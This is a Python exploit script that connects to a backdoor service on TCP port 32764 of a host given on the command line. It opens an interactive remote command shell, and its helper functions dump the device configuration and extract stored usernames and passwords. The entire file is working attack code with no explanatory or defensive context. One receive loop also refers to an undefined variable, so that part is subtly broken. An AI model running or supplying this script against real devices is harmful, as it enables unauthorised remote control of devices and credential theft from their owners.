#!/usr/bin/env python3

import re
import sys
import struct
import socket

if len(sys.argv) < 2:
    print("Usage: exploit.py <host>")
    sys.exit(1)

host = sys.argv[1]
port = 32764

def detect_endian():
    print(f"{host}:{str(port)} - establishing connection ...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((host, port))
    except Exception:
        print(f"{host}:{str(port)} - connection rejected")
        sys.exit(1)

    print(f"{host}:{str(port)} - detecting endian ...")
    s.send(b"alyona")
    response = s.recv(0xC)

    while len(response) < 0xC:
        temp = s.recv(0xC - len(r))
        assert len(temp) != 0
        response += temp

    s.close()
    sig, ret_val, ret_len = struct.unpack('<III', response)

    if sig == 0x53634D4D:
        return "<"
    elif sig == 0x4D4D6353:
        return ">"
    else:
        print(f"{host}:{str(port)} - not vulnerable")
        sys.exit(1)

def talk(s, endian, message, payload=b''):
    print(f"{host}:{str(port)} - trying to talk to backdoor ...")
    header = struct.pack(endian + 'III', 0x53634D4D, message, len(payload)+1)

    s.send(header + payload + b'\x00')
    response = s.recv(0xC)

    while len(response) < 0xC:
        temp = s.recv(0xC - len(response))
        assert len(temp) != 0
        response += temp

    sig, ret_val, ret_len = struct.unpack(endian + 'III', response)
    assert(sig == 0x53634D4D)

    if ret_val != 0:
        print(f"{host}:{str(port)} - not vulnerable")
        sys.exit(1)

    string = b""
    while len(string) < ret_len:
        temp = s.recv(ret_len - len(string))
        assert len(temp) != 0
        string += temp

    return string

def establish_shell():
    endian = detect_endian()

    print(f"{host}:{str(port)} - establishing connection ...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((host, port))
    except Exception:
        print(f"{host}:{str(port)} - connection rejected")
        sys.exit(1)

    print(f"{host}:{str(port)} - shell opened")
    while True:
        print(talk(s, endian, 7, sys.stdin.readline().strip('\n').encode()).decode())

def extract_credentials():
    endian = detect_endian()

    print(f"{host}:{str(port)} - establishing connection ...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((host, port))
    except Exception:
        print(f"{host}:{str(port)} - connection rejected")
        sys.exit(1)

    print(f"{host}:{str(port)} - extracting credentials ...")
    config = talk(s, endian, 1)

    lines = re.split("\x00|\x01", config.decode())
    pattern = re.compile('user(name)?|password|login')

    creds = list()
    for line in lines:
        try:
            variable, value = line.split("=")
            if len(value) > 0 and pattern.search(variable):
                creds.append([variable, value])
        except Exception:
            pass
    
    creds.sort()
    return creds

def get_config():
    endian = detect_endian()

    print(f"{host}:{str(port)} - establishing connection ...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((host, port))
    except Exception:
        print(f"{host}:{str(port)} - connection rejected")
        sys.exit(1)

    print(f"{host}:{str(port)} - getting configuration ...")
    config = talk(s, endian, 1)

    config = config.replace(b'\x00', b'\n')
    config = config.replace(b'\x01', b'\n\t')

    return config.decode()

establish_shell()
